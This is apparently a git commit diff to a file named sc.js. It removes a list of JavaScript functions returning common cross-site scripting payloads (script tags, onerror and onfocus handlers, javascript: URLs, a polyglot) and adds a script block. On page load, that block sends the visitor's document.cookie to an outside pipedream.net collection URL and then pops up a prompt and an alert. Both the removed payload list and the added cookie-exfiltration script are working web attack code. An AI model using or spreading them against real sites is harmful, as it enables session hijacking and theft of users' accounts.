f56f2732c233954d9c22fab5e95832b326e6b452
0x1b <164749781+RHYru9@users.noreply.github.com>
2024-10-03 22:31:25 +0700

    Update sc.js

--- sc.js
+++ sc.js
@@ -1,41 +1,10 @@
-function S() {
-    return `<script>alert('XSS')</script>`;
-}
-
-function X() {
-    return `<img src="x" onerror="alert('XSS')">`;
-}
-
-function d() {
-    return `<a href="javascript%3Aalert%28%27XSS%27%29">Click me</a>`;
-}
-
-function F() {
-    return `<img src="x:alert(1)" onerror="eval(src)">`;
-}
-
-function G() {
-    return `<input autofocus onfocus="alert('XSS')">`;
-}
-
-function R() {
-    return `" autofocus onfocus="alert('XSS')" `;
-}
-
-function T() {
-    return `<style>@import "javascript:alert('XSS')";</style>`;
-}
-
-function Q() {
-    return `'"><img src="x" onerror="alert(1)//'>`;
-}
-
-// Corrected console.log calls
-console.log("Basic XSS: ", S());
-console.log("Image OnError XSS: ", X());
-console.log("URL Encoded XSS: ", d());
-console.log("Obfuscated XSS: ", F());
-console.log("DOM-based XSS: ", G());
-console.log("Attribute XSS: ", R());
-console.log("CSS Context XSS: ", T());
-console.log("Polyglot XSS: ", Q());
+<script type="text/javascript">
+    var rhyru = "Rhyru!";
+    window.onload = function() {
+      var xhttp = new XMLHttpRequest();
+      xhttp.open("GET", "https://eoow6y96ffo9mzx.m.pipedream.net/" + encodeURIComponent(document.cookie), true);
+      xhttp.send();
+      prompt(rhyru);
+      alert(document.domain);
+    };
+  </script></svg>
